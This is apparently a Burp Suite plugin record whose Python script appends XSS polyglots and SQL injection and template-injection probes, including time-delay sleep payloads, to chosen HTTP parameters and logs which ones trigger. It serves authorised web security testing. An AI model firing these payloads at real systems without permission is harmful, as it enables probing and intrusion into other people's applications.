{
    "author": "Lukas Reiter", 
    "plugins": [
        7
    ], 
    "burp_professional_only": false, 
    "uuid": "711a885e-d2dc-46b7-b379-b8ad3f04424b", 
    "version": "v1.1", 
    "script": "\"\"\"\r\nThis script appends XSS polygots to all user-selected parameters.\r\n\r\nUpdate the variable SNIPER if you want to inject the polygots in battery ram style rather than sniper style.\r\n\"\"\"\r\nimport re\r\nfrom datetime import datetime\r\n\r\n\r\nclass ScanItem:\r\n\tdef __init__(self, payload, expected_value=\"\", regex=False, prepand_param_value=False):\r\n\t\tself.payload = unicode(payload)\r\n\t\tself._regex = regex\r\n\t\tself._prepand_param_value = prepand_param_value\r\n\t\tself._expected_value = unicode(expected_value)\r\n\r\n\tdef get_payload(self, parameter):\r\n\t\tpayload = helpers.urlEncode(self.payload)\r\n\t\treturn unicode(parameter.getValue()) + payload if self._prepand_param_value else payload\r\n\r\n\tdef check_response(self, message_info, parameter):\r\n\t\t# global helpers\r\n\t\tresult = False\r\n\t\tresponse = message_info.getResponse()\r\n\t\tif response and self._expected_value or self._prepand_param_value:\r\n\t\t\tresponse = helpers.bytesToString(response)\r\n\t\t\tpattern = parameter.getValue() + self._expected_value if self._prepand_param_value else self._expected_value\r\n\t\t\tif self._regex:\r\n\t\t\t\tresult = re.search(pattern, response) is not None\r\n\t\t\telse:\r\n\t\t\t\tresult = pattern in response\r\n\t\treturn result\r\n\r\n\r\n# If the following variable is set to True, then the script injects the polygot in sniper style (each parameter individually) and if set to False in battery ram style (all parameters at once).\r\nSNIPER = True\r\nheader = [\"Ref.\", \"Host\", \"URL\", \"Parameter\", \"Value\", \"Payload\", \"Hit\", \"Response Timer\", \"Status Code\", \"Content Length\", \"Status Code (New)\", \"Content Length (New)\"]\r\n\r\n# List of XSS polygots to be tested\r\n# Source: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#polyglots\r\nxss_polygots = [ScanItem(\"\", prepand_param_value=True), ScanItem(\"\"\"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>\"\"\", expected_value=\"ja\", prepand_param_value=True),\r\n\tScanItem(\"\"\"javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\"\r\n onmouseover=/*&lt;svg/*/onload=alert()//>\"\"\", expected_value=\"ja\", prepand_param_value=True),\r\n\tScanItem(\"\"\"javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/\"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>\"\"\", expected_value=\"ja\", prepand_param_value=True)]\r\n\r\n# List of basic SQL injection tests\r\nsqli_payloads = [ScanItem(\"\", prepand_param_value=True), ScanItem(\"'\"), ScanItem(\"''\"), ScanItem(\"'||'\"), ScanItem(\"'+'\"), ScanItem(\"+1\"), ScanItem(\"1+1\"), ScanItem(\"' concat '\"),\r\n\tScanItem(\"' --\"), ScanItem(\"'; --\"), ScanItem(\"'--\"), ScanItem(\"';--\"), ScanItem(\"' #\"), ScanItem(\"'; #\"), ScanItem(\"'#\"), ScanItem(\"';#\"),\r\n\tScanItem(\"' OR 1/0 --\"), ScanItem(\"' OR 1/0; --\"), ScanItem(\"' OR 1/0--\"), ScanItem(\"' OR 1/0;--\"), ScanItem(\"' OR 1/0 #\"),\r\n\tScanItem(\"' OR 1/0; #\"), ScanItem(\"' OR 1/0#\"), ScanItem(\"' OR 1/0;#\"), ScanItem(\"'; WAITFOR DELAY ('0:0:5') --\"), ScanItem(\"'; SELECT sleep(10);\"),\r\n\tScanItem(\"'; SELECT pg_sleep(10);\")]\r\n\r\n# SSTI payloads\r\nssti_payloads = [ScanItem(\"\", prepand_param_value=True), ScanItem('{{9999998+1}}', expected_value=9999999), ScanItem('{{1/0}}'), ScanItem(\"\"\"{{<%[%'\"}}%\\\\\"\"\", prepand_param_value=True),\r\n\tScanItem('}}ASDF', expected_value=\"[^}]ASDF\", regex=True), ScanItem(\"\"\"<%=9999998+1%>\"\"\", expected_value=9999999),\r\n\tScanItem(\"\"\"<%=1/0%>\"\"\"), ScanItem(\"\"\"%>ASDF\"\"\", expected_value=\"[^>]ASDF\", regex=True), ScanItem(\"\"\"<%sleep(5)%>\"\"\"),\r\n\tScanItem(\"\"\"${9999998+1}\"\"\", expected_value=9999999), ScanItem('${1/0}}')]\r\n\r\ndef obtain_stats(message_info):\r\n\t\"\"\"\r\n\tThis method obtains statistics from HTTP responses for the UI table.\r\n\t\"\"\"\r\n\tresult = []\r\n\tresponse = message_info.getResponse()\r\n\tif response:\r\n\t\tresponse_info = helpers.analyzeResponse(response)\r\n\t\tbody_offset = response_info.getBodyOffset()\r\n\t\tcontent_length = len(response) - body_offset\r\n\t\tresult.extend([response_info.getStatusCode(), content_length])\r\n\telse:\r\n\t\tresult.extend([-1, -1])\r\n\treturn result\r\n\r\n\r\ndef perform_test(scope_object, payloads, tab_prefix, sniper):\r\n\t\"\"\"\r\n\tThis method creates the test requests based on the given parameters.\r\n\t\"\"\"\r\n\r\n\tif not scope_object.canceled:\r\n\t\tservice_info = message_info.getHttpService()\r\n\t\tif sniper:\r\n\t\t\t# Append current payload to each selected parameter individually.\r\n\t\t\tfor parameter in request_info.getParameters():\r\n\t\t\t\tfor i in range(0, len(payloads)):\r\n\t\t\t\t\tif has_stopped():\r\n\t\t\t\t\t\treturn\r\n\t\t\t\t\tscan_item = payloads[i]\r\n\t\t\t\t\tif scope_object.match(parameter):\r\n\t\t\t\t\t\t# Build updated request\r\n\t\t\t\t\t\tparameter_name = parameter.getName()\r\n\t\t\t\t\t\tnew_parameter = helpers.buildParameter(parameter_name, scan_item.get_payload(parameter), parameter.getType())\r\n\t\t\t\t\t\tnew_request = helpers.updateParameter(message_info.getRequest(), new_parameter)\r\n\t\t\t\t\t\t# Send the updated HTTP request\r\n\t\t\t\t\t\tstart = datetime.now()\r\n\t\t\t\t\t\tnew_message_info = callbacks.makeHttpRequest(service_info, new_request, False)\r\n\t\t\t\t\t\tend = datetime.now()\r\n\t\t\t\t\t\thit = scan_item.check_response(new_message_info, parameter)\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t# Obtain information for UI table\r\n\t\t\t\t\t\trow = [ref, get_hostname(url), url.getPath(), parameter_name, parameter.getValue(), scan_item.payload, hit, (end - start).microseconds]\r\n\t\t\t\t\t\trow += obtain_stats(message_info)\r\n\t\t\t\t\t\trow += obtain_stats(new_message_info)\r\n\t\t\t\t\t\tadd_row(row, {tab_prefix: new_message_info})\r\n\t\telse:\r\n\t\t\t# Append current polygot to all selected parameters at once.\r\n\t\t\tfor i in range(0, len(payloads)):\r\n\t\t\t\tscan_item = payloads[i]\r\n\t\t\t\tnew_request = None\r\n\t\t\t\tif has_stopped():\r\n\t\t\t\t\treturn\r\n\t\t\t\tfor parameter in request_info.getParameters():\r\n\t\t\t\t\tif scope_object.match(parameter):\r\n\t\t\t\t\t\t# Build updated request\r\n\t\t\t\t\t\tparameter_name = parameter.getName()\r\n\t\t\t\t\t\tnew_parameter = helpers.buildParameter(parameter_name, scan_item.get_payload(parameter), parameter.getType())\r\n\t\t\t\t\t\tnew_request = helpers.updateParameter(new_request, new_parameter) if new_request else helpers.updateParameter(message_info.getRequest(), new_parameter)\r\n\t\t\t\tif new_request:\r\n\t\t\t\t\t# Send the updated HTTP request\r\n\t\t\t\t\tstart = datetime.now()\r\n\t\t\t\t\tnew_message_info = callbacks.makeHttpRequest(service_info, new_request, False)\r\n\t\t\t\t\tend = datetime.now()\r\n\t\t\t\t\t# Obtain information for UI table\r\n\t\t\t\t\trow = [ref, get_hostname(url), url.getPath(), None, None, scan_item.payload, None, (end - start).microseconds]\r\n\t\t\t\t\trow += obtain_stats(message_info)\r\n\t\t\t\t\trow += obtain_stats(new_message_info)\r\n\t\t\t\t\tadd_row(row, {tab_prefix: new_message_info})\r\n\r\n# Display scope dialog and define scope\r\nscope_object = show_scope_parameter_dialog(request_info)\r\n\r\n# Perform SQLi test\r\nperform_test(scope_object, sqli_payloads, \"SQLi\", SNIPER)\r\n\r\n# Perform XSS test\r\n# xss_polygots += ssti_payloads\r\n# perform_test(scope_object, xss_polygots, \"XSS/SSTI\", SNIPER)\r\n", 
    "name": "Scan - Template Script to Append Injection Payloads (XSS/SQLi/SSTI) to User-Selected Parameters"
}